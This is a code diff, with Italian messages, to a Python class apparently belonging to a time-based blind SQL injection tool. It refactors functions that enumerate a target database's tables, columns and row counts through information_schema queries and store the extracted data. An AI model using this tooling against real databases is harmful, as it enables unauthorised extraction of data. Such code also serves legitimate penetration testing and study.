@@ -10,19 +10,22 @@ class BlindSqlITimeExtractor(BlindSQLIExtractorBase):
         print(f"Nome del database impostato su: {self.extracted_data.db_name}")
 
     def set_table_target(self, table_name: str):
-        if table_name.strip() not in self.extracted_data.tables.table_names:
+        table_name = table_name.strip()
+        table_name_found = next((item for item in self.extracted_data.tables.table_names if item.table_name == table_name), None)
+
+        if not table_name_found:
             print(
                 f"Errore: la tabella '{table_name}' non è presente nella lista delle tabelle scoperte. Tabelle scoperte: {self.extracted_data.tables.table_names}"
             )
             return
         
-        if self.extracted_data.target.table_name and self.extracted_data.target.table_name != table_name.strip():
+        if table_name_found.table_name and table_name_found.table_name != table_name:
             # TODO: aggiungere conferma sovrascrittura
             self.extracted_data.target = ExtractedDataTarget()
         
         if self.extracted_data.target.table_name: return
 
-        self.extracted_data.target.table_name = table_name.strip()
+        self.extracted_data.target.table_name = table_name
         self.save_data()
 
     def extract_db_name(self):
@@ -85,7 +88,7 @@ class BlindSqlITimeExtractor(BlindSQLIExtractorBase):
                 table_name_length = self.dump_length(
                     f"select LEN(table_name) from information_schema.tables where table_catalog='{self.extracted_data.db_name}' order by table_name offset {i} rows fetch next 1 rows only"
                 )
-                print(f"Tabella {str(i)} - lunghezza nome: {str(table_name_length)}")
+                print(f"\r\nTabella {str(i)} - lunghezza nome: {str(table_name_length)}")
                 self.extracted_data.tables.table_names[i].table_length = table_name_length
                 self.save_data()
                 self.random_time_sleep()
@@ -105,9 +108,9 @@ class BlindSqlITimeExtractor(BlindSQLIExtractorBase):
         return self.extracted_data.tables.table_names
 
     def _extract_column_names(self):
-        target = self.extracted_data.get("target", {})
+        target = self.extracted_data.target
 
-        if target and target.get("total_columns_num", 0) == 0:
+        if target and target.total_columns_num == 0:
             num_columns = self.dump_length(
                 f"SELECT COUNT(*) FROM information_schema.columns WHERE TABLE_CATALOG='{self.extracted_data.db_name}' AND TABLE_NAME='{self.extracted_data.target.table_name}'"
             )
@@ -151,7 +154,7 @@ class BlindSqlITimeExtractor(BlindSQLIExtractorBase):
 
         return self.extracted_data.target.column_names
 
-    def _extract_rows_length(self):
+    def extract_rows_length(self):
         num_rows = self.dump_length(f"SELECT COUNT(*) FROM {self.extracted_data.target.table_name}")
         if not num_rows:
             print(
@@ -159,6 +162,9 @@ class BlindSqlITimeExtractor(BlindSQLIExtractorBase):
             )
             return
         print(f"Nella tabella {self.extracted_data.target.table_name} ci sono {str(num_rows)} righe.")
+        self.extracted_data.target.rows_num = num_rows
+        self.save_data()
+
         return num_rows
 
     def extract_table_info(self, table_name: str):
@@ -166,7 +172,6 @@ class BlindSqlITimeExtractor(BlindSQLIExtractorBase):
 
         self.set_table_target(table_name)
         self._extract_column_names()
-        self._extract_rows_length()
 
     def extract_record_content(self, column_name: str, row_number: int):
         if not self._check_db_name_presence(): return
